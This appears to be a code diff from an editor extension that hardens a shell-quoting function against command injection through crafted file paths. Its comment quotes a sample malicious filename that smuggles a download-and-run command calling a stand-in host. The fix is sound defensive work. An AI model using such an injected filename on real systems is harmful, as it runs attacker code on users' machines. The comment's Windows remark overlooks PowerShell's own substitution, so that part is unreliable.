@@ -28,12 +28,23 @@ function getRunTerminal(): Terminal {
 }
 
 /**
- * Quotes `path` for the shell the integrated terminal runs, defensively
- * (spaces or other shell-special characters in a workspace path shouldn't
- * break the command line).
+ * Quotes `path` for the shell the integrated terminal runs.
+ *
+ * On POSIX shells, wraps in single quotes and escapes embedded `'` as
+ * `'\''` — nothing inside single quotes is special (not `$`, backticks,
+ * `\`, or `"`), so this holds even if `path` is a crafted filename from an
+ * untrusted checkout (e.g. `$(curl evil.sh|sh).ph`). Double-quote escaping
+ * alone does not neutralize `$(...)`/backticks and was exploitable.
+ *
+ * `cmd.exe`/PowerShell don't support single-quote literal quoting the same
+ * way, so Windows keeps double-quote wrapping — good enough there since
+ * `cmd.exe` doesn't perform command substitution on `$`/backticks.
  */
 function shellQuote(path: string): string {
-    return `"${path.replace(/"/g, '\\"')}"`
+    if (process.platform === "win32") {
+        return `"${path.replace(/"/g, '""')}"`
+    }
+    return `'${path.replace(/'/g, `'\\''`)}'`
 }
 
 /**
